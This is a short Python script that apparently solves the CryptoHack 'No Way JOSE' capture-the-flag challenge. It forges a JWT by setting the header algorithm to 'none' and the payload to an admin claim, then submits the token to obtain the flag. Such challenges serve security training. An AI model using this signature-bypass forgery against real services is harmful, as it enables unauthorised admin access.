"""
    No Way JOSE challenge

https://web.cryptohack.org/no-way-jose/
"""

import base64
import requests
base_url = "http://web.cryptohack.org/no-way-jose"

resp = requests.get(base_url + "/create_session/" + "admin")
json_resp = resp.json()
session = json_resp["session"]

print(f"session : {session}")

# Put header, payload and signature in a list
f = session.split('.')

# This makes the Authorization skip the signature verification
f[0] = base64.b64encode(b'{"typ":"JWT","alg":"none"}').decode('ascii')

# Change the privileges to obtain flag
f[1] = base64.b64encode(b'{"username": "admin", "admin": true}').decode('ascii')

# Remove padding characters
f[0] = f[0].replace('=', '')
f[1] = f[1].replace('=', '')

#f = [f[i].decode('ascii') for i in range(len(f))]
token = '.'.join(f)
print(f"new token : {token}")

resp = requests.get(base_url + "/authorise/" + token + '/')
json_resp = resp.json()
if "error" in json_resp:
    output = json_resp["error"]
else:
    output = json_resp["response"]

print(output)
